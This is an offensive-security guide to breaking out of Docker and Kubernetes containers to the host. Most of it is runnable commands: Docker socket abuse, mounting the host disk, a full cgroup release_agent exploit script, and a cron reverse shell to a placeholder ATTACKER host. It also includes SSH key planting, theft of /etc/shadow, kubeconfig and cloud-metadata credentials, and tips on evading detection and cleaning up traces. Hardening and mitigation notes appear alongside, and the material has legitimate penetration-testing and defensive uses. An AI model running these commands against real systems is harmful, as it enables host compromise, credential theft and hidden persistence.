# Container & Docker Escape Guide

Offensive tradecraft for breaking out of Linux containers (Docker, containerd, CRI-O,
and the container runtime under Kubernetes) to the host: how to fingerprint that you
are in a container, identify the misconfiguration that enables escape, and execute the
canonical breakouts — privileged mode, dangerous capabilities (`CAP_SYS_ADMIN`,
`CAP_DAC_READ_SEARCH`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`), host-namespace sharing,
exposed Docker socket, host mounts, cgroup `release_agent`, and notable runtime CVEs.
Grounded in 2025-2026 tradecraft (HackTricks, 0xn3va cheat-sheets, CVE-2022-0492,
runC/Leaky Vessels CVE-2024-21626).

> **Principle:** A container is just a process with namespaces + cgroups + capability
> restrictions + (often) seccomp/AppArmor/SELinux. An escape is any path that lets you
> read/write host resources or run code in the host's namespaces. Find which isolation
> control is missing, then pull the matching lever.

---

## 1. Am I in a Container? (Fingerprinting)

```bash
# Telltale signs
cat /proc/1/cgroup                      # mentions /docker/, /kubepods/, containerd
ls -la /.dockerenv                      # Docker creates this file
cat /proc/self/status | grep -i seccomp # Seccomp:  2 = filtered
cat /proc/self/mountinfo | grep -i overlay   # overlay fs = containerized rootfs
hostname                                # often a short container ID
env | grep -iE 'KUBERNETES|DOCKER'      # orchestrator env vars

# Automated context tooling
amicontained                            # https://github.com/genuinetools/amicontained — caps, seccomp, namespaces
deepce.sh                               # https://github.com/stealthcopter/deepce — full enumeration + auto-exploit
```

```bash
# amicontained sample output tells you the WHOLE attack surface:
#   Container Runtime: docker
#   Has Namespaces: pid:true user:false
#   AppArmor Profile: docker-default (enforce)   <- or "unconfined" = great
#   Capabilities:  ... CAP_SYS_ADMIN ...         <- dangerous caps here
#   Seccomp: filtering                            <- "disabled" = great
```

---

## 2. Triage: Which Lever Can I Pull?

```bash
# Capabilities (the single most important check)
capsh --print
grep CapEff /proc/self/status            # decode: capsh --decode=00000000a80425fb

# Is the container privileged? (privileged = all caps + no seccomp/apparmor + host devices)
ls -la /dev                              # /dev/sda, /dev/mem visible = privileged
cat /proc/self/status | grep CapEff      # privileged ≈ 0000003fffffffff / ...ffff

# Host namespaces shared?
ls -la /proc/1/ns/                       # compare with host if you can
# hostPID (K8s) → you see host processes:
ps aux                                   # host PIDs visible = hostPID:true

# Mounted host paths / sockets
mount
ls -la /var/run/docker.sock 2>/dev/null  # exposed Docker socket = instant escape
ls -la /run/containerd/containerd.sock 2>/dev/null
find / -name '*.sock' 2>/dev/null

# Writable host mounts
cat /proc/mounts | grep -v 'ro,'         # rw mounts of host paths
```

Decision table:

| What you have | Escape |
|---------------|--------|
| `/var/run/docker.sock` | §3 — spawn a privileged host container |
| Privileged container | §4 — mount host disk / cgroup release_agent |
| `CAP_SYS_ADMIN` (+cgroup v1 rw) | §5 — release_agent / CVE-2022-0492 |
| `CAP_DAC_READ_SEARCH` | §6 — shocker / open_by_handle_at, read host files |
| `CAP_SYS_PTRACE` + hostPID | §7 — inject into a host process |
| `CAP_SYS_MODULE` | §8 — load a kernel module |
| hostPath / writable host mount | §9 — write cron/SSH/SUID on host |
| Old runC (≤1.1.11) | §10 — CVE-2024-21626 Leaky Vessels |

---

## 3. Exposed Docker / containerd Socket

The most common and most powerful misconfig — talking to the Docker daemon = root on host.

```bash
# Confirm
curl -s --unix-socket /var/run/docker.sock http://localhost/version

# Spawn a new container that mounts the host root, then chroot — instant host root
docker -H unix:///var/run/docker.sock run -it --rm --privileged \
  -v /:/host alpine chroot /host sh
# If 'docker' CLI absent, raw API:
curl -s -XPOST --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["chroot","/host","sh","-c","id;cat /etc/shadow"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}' \
  http://localhost/containers/create
# then /start and attach.

# containerd socket → use ctr/crictl similarly
ctr --address /run/containerd/containerd.sock images list
```

---

## 4. Privileged Container

A `--privileged` container has all capabilities, no seccomp/AppArmor, and host device
access — multiple trivial escapes.

```bash
# A. Mount the host's disk directly and read/write its filesystem
fdisk -l                                  # find the host disk, e.g. /dev/sda1
mkdir -p /mnt/host && mount /dev/sda1 /mnt/host
chroot /mnt/host sh                        # = root on host fs (add SSH key, read /etc/shadow)

# B. cgroup v1 release_agent escape (works in privileged AND in CAP_SYS_ADMIN — see §5)
```

---

## 5. CAP_SYS_ADMIN — cgroup v1 `release_agent` Escape (CVE-2022-0492)

Classic capability escape. Requires `CAP_SYS_ADMIN`, a **cgroup v1** rw mount, no
blocking AppArmor, and the `mount` syscall allowed (i.e., not blocked by seccomp).

```bash
# Set up an RDMA (or memory) cgroup we control
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp 2>/dev/null || \
  mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release

# Find this container's path on the HOST overlay filesystem
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)

# Point release_agent at a script that runs (as host root) when the cgroup empties
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat > /cmd <<EOF
#!/bin/sh
ps aux > $host_path/output        # proof: host process list written back into container
# or: cat /etc/shadow > $host_path/output ; or drop an SSH key / reverse shell
EOF
chmod +x /cmd

# Trigger: enter and exit the cgroup → kernel runs /cmd as ROOT in the host's namespaces
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
cat /output
```

> **Mitigation note for the report:** fixed by cgroup **v2** (no `release_agent`),
> kernel patch CVE-2022-0492, dropping `CAP_SYS_ADMIN`, and a blocking seccomp/AppArmor
> profile. Flag any container running with `CAP_SYS_ADMIN` on a cgroup-v1 host.

---

## 6. CAP_DAC_READ_SEARCH — Read Any Host File (Shocker)

`CAP_DAC_READ_SEARCH` bypasses file *read* permission checks; with `open_by_handle_at`
you can brute-force file handles outside the container to read host files (`/etc/shadow`,
SSH keys, kube admin.conf).

```bash
# Use the classic "shocker" / DirtyCred-style PoC (compile inside container)
# https://github.com/0xn3va/cheat-sheets (Container/Escaping/excessive-capabilities)
gcc -o shocker shocker.c && ./shocker /etc/shadow   # reads host /etc/shadow
```

---

## 7. CAP_SYS_PTRACE + hostPID — Inject Into a Host Process

```bash
# With shared host PID namespace and ptrace, inject shellcode into a host root process
# (e.g. via https://github.com/0x00pf/0x00sec_code or a python ctypes injector)
ps aux                                  # pick a host root PID
# inject a reverse-shell payload into it → code execution in host context
```

---

## 8. CAP_SYS_MODULE — Load a Kernel Module

```bash
# Build a minimal LKM whose init_module() runs a host reverse shell, then insmod it
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
insmod reverse-shell.ko                  # runs in kernel/host context → host root
```

---

## 9. Writable Host Mount / hostPath

```bash
# If a host directory is bind-mounted rw, escape via host scheduled tasks / SSH / SUID
# e.g. /host mounted rw:
echo '* * * * * root bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' >> /host/etc/cron.d/x
# or drop an authorized_keys / a SUID-root binary the host will execute
cat ~/.ssh/id_rsa.pub >> /host/root/.ssh/authorized_keys
```

---

## 10. Runtime CVEs (keep current)

| CVE | Component | Effect |
|-----|-----------|--------|
| CVE-2024-21626 (**Leaky Vessels**) | runC ≤1.1.11 | WORKDIR/fd leak → host fs access during `docker build`/`run` |
| CVE-2022-0492 | Linux cgroup v1 | release_agent escape via `CAP_SYS_ADMIN` |
| CVE-2019-5736 | runC | overwrite host `runc` binary from inside container → host RCE |
| CVE-2019-14271 | docker cp | code exec on host via `docker cp` |
| CVE-2024-21334 | containerd | (Windows/host networking) |

```bash
# Always fingerprint runtime versions when you have host or socket access
docker version 2>/dev/null
runc --version 2>/dev/null
containerd --version 2>/dev/null
```

---

## 11. Post-Escape: Establish Host Foothold

```bash
# After chroot/mount to host: persistence + creds
cat /etc/shadow                          # crack offline
cat /root/.ssh/id_rsa
cat /var/lib/kubelet/...kubeconfig        # K8s pivot
curl http://169.254.169.254/...           # cloud IMDS pivot (see cloud guides)
# Persistence: SSH key, cron, systemd unit, SUID binary
```

---

## 12. Defense Evasion & OPSEC

- Falco/Tetragon/Defender-for-Containers flag: privileged-pod creation, `mount`
  syscalls in containers, writes to `release_agent`, `setns`, `insmod`, and
  unexpected `chroot`. Escapes are **high-signal** — only run with explicit RoE.
- Reading host files via capabilities is quieter than a full mount+chroot. Prefer the
  least-noisy lever that achieves the objective.
- Clean up: unmount, remove dropped scripts/cron entries, restore `release_agent`.

---

## 13. Hardening Checklist (for the remediation section)

- Run as non-root; `--user`, `runAsNonRoot: true`, drop ALL caps, add back minimum.
- Never `--privileged`; never mount `docker.sock` into a container.
- Enforce seccomp (`RuntimeDefault`), AppArmor/SELinux; cgroup v2; read-only rootfs.
- Pod Security Admission `restricted`; no `hostPID/hostNetwork/hostPath`; patch runC.
- Use gVisor/Kata for untrusted workloads; restrict IMDS (hop-limit 1 / proxy).

---

## 14. Tooling Quick Reference

| Tool | One-liner | Use |
|------|-----------|-----|
| **amicontained** | `amicontained` | Caps/seccomp/namespace fingerprint |
| **deepce** | `./deepce.sh` | Container enum + auto-escape attempts |
| **CDK** | `cdk evaluate` / `cdk run` | Container escape toolkit (zero-dep) |
| **linpeas (container mode)** | `./linpeas.sh` | Local enum incl. container checks |
| **kubeletctl** | `kubeletctl exec ...` | (K8s) abuse kubelet to land in pods |
| **Trivy** | `trivy image <img>` | Scan image for vulns/secrets/misconfig |
| **docker/ctr/crictl** | `docker -H unix://docker.sock run ...` | Socket abuse |

---

## 15. MITRE ATT&CK Mapping

| Technique | ID | Context |
|-----------|-----|---------|
| Escape to Host | T1611 | All container breakouts |
| Exploitation for Privilege Escalation | T1068 | runC/cgroup CVEs |
| Abuse Elevation Control Mechanism | T1548 | Capability abuse |
| Container Administration Command | T1609 | Docker/containerd socket |
| Deploy Container | T1610 | Spawn privileged container |
| Unsecured Credentials | T1552 | Host files / IMDS after escape |
| Create or Modify System Process | T1543 | Host persistence post-escape |

---

## References

- HackTricks — Docker release_agent cgroups escape: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/docker-release_agent-cgroups-escape.html
- 0xn3va cheat-sheets — Container escaping (excessive capabilities): https://github.com/0xn3va/cheat-sheets/blob/main/Container/Escaping/excessive-capabilities.md
- Snyk / Leaky Vessels — CVE-2024-21626 (runC): https://snyk.io/blog/leaky-vessels-docker-runc-container-breakout-vulnerabilities/
- Unit 42 / Palo Alto — CVE-2022-0492 cgroups escape analysis: https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/
- amicontained: https://github.com/genuinetools/amicontained
- deepce: https://github.com/stealthcopter/deepce
- CDK (container escape toolkit): https://github.com/cdk-team/CDK
- Sysdig — Detecting container escapes with Falco: https://www.sysdig.com/blog/container-escape-capabilities-falco-detection
- MITRE ATT&CK — Escape to Host (T1611): https://attack.mitre.org/techniques/T1611/
